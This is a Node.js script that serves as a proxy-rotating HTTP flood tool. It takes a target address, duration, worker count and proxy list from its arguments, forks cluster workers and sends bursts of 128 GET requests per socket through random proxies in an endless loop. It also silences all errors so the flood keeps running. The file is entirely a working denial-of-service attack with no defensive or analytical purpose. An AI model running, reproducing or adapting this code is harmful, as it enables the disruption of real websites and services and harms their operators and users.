process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
const net = require('net');
const fs = require('fs');
const url = require('url');
const cluster = require('cluster');
var proxies = fs.readFileSync(process.argv[6], 'utf-8').toString().replace(/\r/g, '').split('\n');
var tarPOST = "http://"+process.argv[2]+":"+process.argv[3];
var parsed = url.parse(tarPOST);
if (cluster.isMaster){
    for (let i = 0; i<process.argv[5]; i++){
        cluster.fork();
    }
setTimeout(() => {
process.exit(1);
}, process.argv[4] * 1000);
}
//const AllUA = fs.readFileSync("header.txt", 'utf-8').toString().replace(/\r/g, '').split('\n'); //读取UA

setInterval(function() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');
    var socket = net.connect(proxy[1], proxy[0]);
    socket.setKeepAlive(false, 0);
    socket.setTimeout(5000);
    for (let j = 0; j < 128; j++) {
    socket.write('GET ' + tarPOST +' HTTP/1.1\r\nHost: '+ parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + '\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-HK,zh;q=0.9,en;q=0.8,zh-CN;q=0.7,en-US;q=0.6\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n');
    }
	socket.on('data', function() {
        setTimeout(function() {
            socket.destroy();
            return delete socket;
        }, 5000);
    })
});